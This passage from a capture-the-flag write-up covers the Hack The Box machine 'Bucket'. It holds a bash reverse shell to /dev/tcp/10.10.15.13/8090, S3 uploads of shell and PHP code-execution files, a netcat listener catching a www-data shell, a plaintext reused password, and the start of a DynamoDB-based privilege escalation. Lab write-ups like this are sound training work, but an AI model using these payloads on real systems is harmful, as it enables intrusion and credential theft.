bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.15.13/8090 0&gt;&amp;1'</span>
</pre></table></code></div></div><p>Since PHP did not seem to execute, I decided to try uploading a bash reverse shell instead.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws s3 cp --endpoint-url http://s3.bucket.htb ./test.sh s3://adserver
upload: ./test.sh to s3://adserver/test.sh
</pre></table></code></div></div><p>I uploaded it to the server.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws ssm send-command \
    --document-name "AWS-RunRemoteScript" \
    --targets "Key=instanceids,Values=adserver" \
    --parameters '{"sourceType":["S3"],"sourceInfo":["{\"path\":\"http://s3.bucket.htb/adserver/test.sh\"}"],"commandLine":["test.sh"]}' --endpoint-url http://s3.bucket.htb
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws ssm send-command \
    --document-name "AWS-RunRemoteScript" \
    --targets "Key=instanceids,Values=adserver" \
    --parameters '{"sourceType":["S3"],"sourceInfo":["{\"path\":\"s3://adserver/test.sh\"}"],"commandLine":["test.sh"]}' --endpoint-url http://s3.bucket.htb
</pre></table></code></div></div><ul><li>https://docs.aws.amazon.com/systems-manager/latest/userguide/integration-s3-shell.html</ul><p>I had found this page that seemed to talk about running shell scripts, but uploading and running my reverse shell on the server failed as well.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws s3 cp --endpoint-url http://s3.bucket.htb ~/php-code-exec.php s3://adserver
upload: ../../php-code-exec.php to s3://adserver/php-code-exec.php
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/
                           PRE images/
2021-03-14 19:33:04       5344 index.html
2021-03-14 19:34:18         42 php-code-exec.php
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/
                           PRE images/
2021-03-14 19:35:04       5344 index.html
</pre></table></code></div></div><p>Since the initial upload folder did not allow me to execute PHP, I tried uploading it to another folder using directory traversal. The folder was cleaned up quickly, though, so I had to keep trying to get my reverse shell to execute.</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ script                                                                                         1 ⨯
Script started, output log file is 'typescript'.
┌──(zweilos㉿kali)-[~/htb/bucket]
└─$ bash                                                             
zweilos@kali:~/htb/bucket$ nc -lvnp 8090
listening on [any] 8090 ...
connect to [10.10.14.158] from (UNKNOWN) [10.10.10.212] 47228
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:52:03 up  3:08,  0 users,  load average: 1.59, 6.00, 4.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ which python3
/usr/bin/python3
$ ptyhon3 -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 3: ptyhon3: not found
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bucket:/$ ^Z
[1]+  Stopped                 nc -lvnp 8090
zweilos@kali:~/htb/bucket$ stty raw -echo
speed 38400 baud; rows 46; columns 103; line = 0;
                                                 intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;;
                                                start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
                                               
                                                                                                      znc -lvnp 8090a:~/htb/bucket$                                                                           

www-data@bucket:/$ stty rows 46 columns 103
www-data@bucket:/$ export TERM=xterm-256color
</pre></table></code></div></div><p>However, my patience paid off and I was able to get a shell back on my waiting listener. I quickly upgraded to a full shell using python3 and began looking around. I started out in the root directory of the machine, which was a bit strange as I was logged in as the user <code class="language-plaintext highlighter-rouge">www-data</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>www-data@bucket:/$ ls -la
total 80
drwxr-xr-x  21 root root  4096 Feb 10 12:49 .
drwxr-xr-x  21 root root  4096 Feb 10 12:49 ..
drwxr-xr-x   2 root root  4096 Sep 23 03:18 .aws
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Oct  2 09:23 boot
drwxr-xr-x   2 root root  4096 May  7  2020 cdrom
drwxr-xr-x  17 root root  3920 Mar 14 20:44 dev
drwxr-xr-x 107 root root  4096 Feb 10 12:51 etc
drwxr-xr-x   3 root root  4096 Sep 16 12:59 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 May  7  2020 lost+found
drwxr-xr-x   2 root root  4096 Apr 23  2020 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   3 root root  4096 Sep 16 10:28 opt
dr-xr-xr-x 243 root root     0 Mar 14 20:43 proc
drwx------  11 root root  4096 Sep 24 04:09 root
drwxr-xr-x  30 root root   920 Mar 14 20:44 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -&gt; usr/sbin
drwxr-xr-x   6 root root  4096 May  7  2020 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Mar 14 20:44 sys
drwxrwxrwt   2 root root  4096 Mar 14 23:29 tmp
drwxr-xr-x  14 root root  4096 Apr 23  2020 usr
drwxr-xr-x  14 root root  4096 Feb 10 12:29 var
www-data@bucket:/$ cd .aws
www-data@bucket:/.aws$ ls -la
total 16
drwxr-xr-x  2 root root 4096 Sep 23 03:18 .
drwxr-xr-x 21 root root 4096 Feb 10 12:49 ..
-rw-------  1 root root   22 Sep 16 13:13 config
-rw-------  1 root root   64 Sep 16 10:57 credentials
</pre></table></code></div></div><p>In the root I noticed that there was a hidden <code class="language-plaintext highlighter-rouge">.aws</code> directory, which had two interesting looking files inside. However, these were both owned by <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre>www-data@bucket:/.aws$ cd /home
www-data@bucket:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Sep 16 12:59 .
drwxr-xr-x 21 root root 4096 Feb 10 12:49 ..
drwxr-xr-x  3 roy  roy  4096 Sep 24 03:16 roy
www-data@bucket:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
roy:x:1000:1000:,,,:/home/roy:/bin/bash
</pre></table></code></div></div><p>There was a user named <code class="language-plaintext highlighter-rouge">roy</code> on this machine who would log in, and had a <code class="language-plaintext highlighter-rouge">/home</code> folder. I wondered if any of the passwords I found earlier would work for him.</p><h3 id="finding-user-creds">Finding user creds</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>www-data@bucket:/home$ su roy
Password: 
su: Authentication failure
www-data@bucket:/home$ su roy
Password: 
su: Authentication failure
www-data@bucket:/home$ su roy
Password: 
roy@bucket:/home$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
</pre></table></code></div></div><p>The first two passwords didn’t work, but the third (<code class="language-plaintext highlighter-rouge">n2vM-&lt;_K_Q:.Aa2</code>) let me switch to the user <code class="language-plaintext highlighter-rouge">roy</code>. Roy was a member of the <code class="language-plaintext highlighter-rouge">sysadm</code> group which was very interesting.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>roy@bucket:/home$ sudo -l
[sudo] password for roy: 
Sorry, user roy may not run sudo on bucket.
</pre></table></code></div></div><p>Unfortunately <code class="language-plaintext highlighter-rouge">roy</code> was not able to run <code class="language-plaintext highlighter-rouge">sudo</code> on this machine.</p><h3 id="usertxt">User.txt</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>roy@bucket:/home$ cd roy
roy@bucket:~$ ls -la
total 28
drwxr-xr-x 3 roy  roy  4096 Sep 24 03:16 .
drwxr-xr-x 3 root root 4096 Sep 16 12:59 ..
lrwxrwxrwx 1 roy  roy     9 Sep 16 12:59 .bash_history -&gt; /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16 12:59 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16 12:59 .bashrc
-rw-r--r-- 1 roy  roy   807 Sep 16 12:59 .profile
drwxr-xr-x 3 roy  roy  4096 Sep 24 03:16 project
-r-------- 1 roy  roy    33 Mar 14 20:44 user.txt
roy@bucket:~$ cat user.txt 
94cb50c7a89bf4dd549ffa4df5768156
</pre></table></code></div></div><p>He was, however, the owner of the user flag!</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-roy">Enumeration as <code class="language-plaintext highlighter-rouge">roy</code></h3><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
<span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Aws\DynamoDb\Exception\DynamoDbException</span><span class="p">;</span>

<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Aws\Sdk</span><span class="p">([</span>
    <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
    <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
    <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
    <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
<span class="p">]);</span>

<span class="nv">$dynamodb</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">createDynamoDb</span><span class="p">();</span>

<span class="c1">//todo</span>
</pre></table></code></div></div><p>There was a <code class="language-plaintext highlighter-rouge">db.php</code> file in the <code class="language-plaintext highlighter-rouge">projects</code> folder. Also the file <code class="language-plaintext highlighter-rouge">composer.lock</code> held the version numbers of all of the files for the AWS PHP implementation. It reported the main version as , which was old.</p><ul><li>https://github.com/aws/aws-sdk-php/blob/master/CHANGELOG.md</ul><p>There did not seem to be any vulnerabilities that I could see in the changelogs. I decided to look more into the DynamoDB client that was being created in that <code class="language-plaintext highlighter-rouge">db.php</code> file. It was listening on port 4566, which had not shown up on my initial nmap scan so I checked to see if it was running.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>roy@bucket:~/project/vendor/bin$ netstat -tulvnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41703         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*
</pre></table></code></div></div><p>When I checked the ports that were open with <code class="language-plaintext highlighter-rouge">netstat</code> I noticed that there were a few ports open internally that I had not seen in my initial nmap scan: 4566, 8000, and 41703.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>roy@bucket:~/project/vendor/bin$ curl http://localhost:4566
{"status": "running"}
</pre></table></code></div></div><p>Using curl to connect to port 4566 simply gave a json response that said that something was running.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span> <span class="nt">&gt;</span>

<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;title&gt;</span>We are not ready yet!<span class="nt">&lt;/title&gt;</span>  
  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"</span><span class="nt">&gt;</span>

<span class="nt">&lt;style&gt;</span>
<span class="o">..</span><span class="nc">.snipped</span> <span class="nt">excess</span> <span class="nt">CSS</span> <span class="nt">code</span><span class="o">...</span>
<span class="nt">&lt;/style&gt;</span>

  <span class="nt">&lt;script&gt;</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">console</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">console</span> <span class="o">||</span> <span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{};</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;script&gt;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/type=embed/gi</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">resize</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body</span> <span class="na">translate=</span><span class="s">"no"</span> <span class="nt">&gt;</span>
  <span class="nt">&lt;main&gt;</span>
  <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"advice"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"advice__title"</span><span class="nt">&gt;</span>Site under construction or maintenance <span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"advice__description"</span><span class="nt">&gt;&lt;span&gt;&lt;</span><span class="err">&lt;/</span><span class="na">span</span><span class="nt">&gt;</span> Bucket Application <span class="nt">&lt;span&gt;</span>/&gt;<span class="nt">&lt;/span&gt;</span> not finished yet<span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;/section&gt;</span>
  <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"city-stuff"</span><span class="nt">&gt;</span>
    ...snipped excess lists...
  <span class="nt">&lt;/section&gt;</span>
<span class="nt">&lt;/main&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://static.codepen.io/assets/common/stopExecutionOnTimeout-157cd5b220a5c80d4ff8e0e70ac069bffd87a61252088146915e8726e5d9f147.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

 
    <span class="nt">&lt;script </span><span class="na">id=</span><span class="s">"rendered-js"</span> <span class="nt">&gt;</span>
<span class="c1">// ¯\_(ツ)_/¯ I told you that there was no JS</span>
<span class="c1">//# sourceURL=pen.js</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Port 8000, however, hosted a website for a Bucket Appliance that was still under construction. There was an interesting comment at the bottom that said “I told you that there was no JS” and had a commented out link to <code class="language-plaintext highlighter-rouge">pen.js</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>roy@bucket:~<span class="nv">$ </span>find / <span class="nt">-name</span> pen.js 2&gt;/dev/null
roy@bucket:~<span class="err">$</span>
</pre></table></code></div></div><p>I was curious, so I searched for the file <code class="language-plaintext highlighter-rouge">pen.js</code> to see what it was, but it didnt seem to exist.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>roy@bucket:/var$ cd www
roy@bucket:/var/www$ ls -la
total 16
drwxr-xr-x   4 root root 4096 Feb 10 12:29 .
drwxr-xr-x  14 root root 4096 Feb 10 12:29 ..
drwxr-x---+  4 root root 4096 Feb 10 12:29 bucket-app
drwxr-xr-x   2 root root 4096 Mar 15 00:37 html
roy@bucket:/var/www$ cd bucket-app/
roy@bucket:/var/www/bucket-app$ ls -la
total 856
drwxr-x---+  4 root root   4096 Feb 10 12:29 .
drwxr-xr-x   4 root root   4096 Feb 10 12:29 ..
-rw-r-x---+  1 root root     63 Sep 23 02:23 composer.json
-rw-r-x---+  1 root root  20533 Sep 23 02:23 composer.lock
drwxr-x---+  2 root root   4096 Mar 15 00:09 files
-rwxr-x---+  1 root root  17222 Sep 23 03:32 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Feb 10 12:29 vendor
</pre></table></code></div></div><p>I did some manual enumeration of the <code class="language-plaintext highlighter-rouge">www</code> directory to see if I could find what was hosted on port 8000, and found another page’s files in the <code class="language-plaintext highlighter-rouge">bucket-app</code> directory. These were all owned by root, which was odd.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span><span class="o">===</span><span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span><span class="o">===</span><span class="s2">"get_alerts"</span><span class="p">)</span> <span class="p">{</span>
                <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
                <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DynamoDbClient</span><span class="p">([</span>
                        <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
                        <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
                        <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
                        <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
                <span class="p">]);</span>

                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">getIterator</span><span class="p">(</span><span class="s1">'Scan'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span><span class="p">,</span>
                        <span class="s1">'FilterExpression'</span> <span class="o">=&gt;</span> <span class="s2">"title = :title"</span><span class="p">,</span>
                        <span class="s1">'ExpressionAttributeValues'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">":title"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">"S"</span><span class="o">=&gt;</span><span class="s2">"Ransomware"</span><span class="p">)),</span>
                <span class="p">));</span>

                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$name</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.html'</span><span class="p">;</span>
                        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'files/'</span><span class="mf">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="nb">passthru</span><span class="p">(</span><span class="s2">"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">index.php</code> in this folder matched what curl had delivered to me, but contained some additional PHP code. This seemed similar to the file I had seen in the <code class="language-plaintext highlighter-rouge">projects</code> folder, with a DynamoDb instance being created after a POST request looking for alerts. It then reads the database called <code class="language-plaintext highlighter-rouge">alerts</code> and pulls out the titles that have Ransomware in them. After that it creates a random number between 1 and 10000 and saves that as the filename of an html file. This gets saved as a PDF file named <code class="language-plaintext highlighter-rouge">results.pdf</code> in the folder <code class="language-plaintext highlighter-rouge">/var/www/bucket-app/files/</code> using the java program <code class="language-plaintext highlighter-rouge">Pd4Cmd</code>.</p><p>I double checked again to be sure, but there didn’t seem to be an <code class="language-plaintext highlighter-rouge">alerts</code> table in the database. This seemed like a good opportunity to make one!</p><ul><li>https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html</ul><p>I found a page in the AWS documentation that specified how to create a DynamoDb database.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
	--provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 --endpoint-url http://s3.bucket.htb
</pre></table></code></div></div><p>I used the AWS CLI to create the table called <code class="language-plaintext highlighter-rouge">alerts</code> using the information from the documentation and got back a response.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"TableDescription"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AttributeDefinitions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="p">{</span><span class="w">
                </span><span class="nl">"AttributeName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"title"</span><span class="p">,</span><span class="w">
                </span><span class="nl">"AttributeType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"S"</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="p">{</span><span class="w">
                </span><span class="nl">"AttributeName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"data"</span><span class="p">,</span><span class="w">
                </span><span class="nl">"AttributeType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"S"</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">],</span><span class="w">
        </span><span class="nl">"TableName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"alerts"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"KeySchema"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="p">{</span><span class="w">
                </span><span class="nl">"AttributeName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"title"</span><span class="p">,</span><span class="w">
                </span><span class="nl">"KeyType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HASH"</span><span class="w">
            </span><span class="p">},</span><span class="w">
            </span><span class="p">{</span><span class="w">
                </span><span class="nl">"AttributeName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"data"</span><span class="p">,</span><span class="w">
